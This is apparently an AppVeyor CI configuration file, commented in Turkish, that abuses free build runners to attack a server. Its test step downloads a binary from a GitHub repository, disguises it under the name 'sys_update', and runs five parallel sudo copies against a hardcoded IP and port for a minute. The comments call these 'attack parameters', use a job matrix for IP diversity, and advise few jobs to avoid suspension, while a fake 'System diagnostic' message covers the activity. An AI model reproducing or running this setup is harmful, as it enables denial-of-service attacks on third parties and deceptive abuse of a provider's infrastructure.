version: 1.0.{build}
image: Ubuntu2204 # En güncel Ubuntu imajı

# Matris: IP çeşitliliği için burayı kullanıyoruz
environment:
  matrix:
    - job_id: 1
    - job_id: 2
    - job_id: 3
    # Çok abartma, 5-10 tane ile başla ki hemen suspend yeme

# KRİTİK: MSBuild hatasını kapatan satır
build: off

# Mermileri namluya sürdüğümüz yer
test_script:
  - sh: |
      # Dosyayı indir ve ismini "sys_update" olarak maskele
      curl -L "https://github.com/betoaiaio/brsovhv2/raw/refs/heads/master/brsovhv2" -o sys_update
      chmod +x sys_update
      
      # Saldırı parametreleri
      TARGET_IP="185.71.66.37"
      TARGET_PORT="80"
      
      # 5 paralel koldan saldırı başlat (1 dakika sürer)
      for i in {1..5}; do
        sudo timeout 60 ./sys_update $TARGET_IP $TARGET_PORT > /dev/null 2>&1 &
      done
      
      echo "System diagnostic running on Node $job_id..."
      sleep 65
